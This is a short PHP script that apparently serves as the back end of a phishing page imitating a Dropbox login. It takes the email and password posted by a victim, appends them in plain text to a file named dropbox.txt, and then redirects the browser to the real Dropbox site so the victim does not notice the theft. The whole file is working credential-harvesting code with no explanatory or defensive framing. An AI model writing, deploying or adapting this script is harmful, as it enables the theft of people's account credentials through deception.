<?php


file_put_contents("dropbox.txt", 
"Dropbox Username: " . $_POST['login_email'] . "
Dropbox Password: " . $_POST['login_password'] . "\n", FILE_APPEND);
header('Location: https://www.dropbox.com');
exit();
?>